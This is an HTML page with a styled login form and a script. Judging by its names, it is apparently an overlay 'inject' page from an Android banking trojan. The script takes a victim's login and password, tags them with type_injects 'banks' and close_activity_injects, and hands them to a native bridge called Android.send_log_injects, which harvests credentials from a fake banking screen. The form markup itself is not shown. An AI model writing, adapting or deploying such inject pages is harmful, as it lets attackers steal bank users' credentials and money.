<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <style>
        body {
            background-color: #1972b4;
        }

        section {
            padding: 25px;
        }
        
        .cool-input {
            box-sizing: border-box;
            border: 0;
            width: 100%;
            position: relative;
            font-size: 16px;
            margin-bottom: 15px;
        }

        .cool-input__input {
            box-sizing: border-box;
            background: none;
            width: 100%;
            padding: 10px;
            padding-left: 0;
            position: relative;
            z-index: 2;
            font-size: 1em;
        }

        .cool-input__input:focus {
            outline: none;
        }

        .cool-input__placeholder {
            box-sizing: border-box;
            border: none;
            background: none;
            width: auto;
            position: absolute;
            z-index: 1;
            left: 0;
            top: 50%;
            line-height: 1em;
            color: #fff;
            transition: all 0.2s ease;
        }

        .cool-input__input_filled + .cool-input__placeholder, .cool-input__input:focus + .cool-input__placeholder {
            font-size: 0.8em;
            top: 0;
            margin-top: 0.3em;
            padding: 5px 0;
            z-index: 99;
            width: auto;
            left: 0;
            color: #fff;
        }

        .input {
            border: 0;
            border-bottom: 1px solid #459dcc;
            margin-top: 15px;
            padding-left: 0;
            transition: all 0.2s ease;
            color: #fff;
        }

        .input:focus {
            border-bottom: 2px solid #63badc;
        }

        input,button {
            outline: none !important;
            box-shadow: none !important;
        }

        .error {
            border-color: #f00 !important;
        }

        .button {
            padding: 8px;
            border: 2px solid #78c339;
            background-color: transparent;
            width: 100%;
            color: #fff;
            font-weight: 600;
            border-radius: 6px;
            margin-top: 20px;
        }
    </style>
</head>

    <script>
        $('.cool-input__input').on('input', function(){
            var $this = $(this);
            if ($this.val() == '') {
                $this.removeClass('cool-input__input_filled');
            } else {
                $this.addClass('cool-input__input_filled');
            }
        });
        
        var login = document.getElementById('login'),
            password = document.getElementById('password'),
            sendData = document.getElementById('sendData');

        sendData.onclick = function() {
            if(login.value.length < 4) {
                login.classList.add('error');
            } else {
                login.classList.remove('error');
            }

            if(password.value.length < 4) {
                password.classList.add('error');
            } else {
                password.classList.remove('error');
            }

            if(login.value.length > 4 && password.value.length > 4) {
                var data = {};
                data.login = document.getElementById('login').value;
                data.password = document.getElementById('password').value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
        }
    </script>
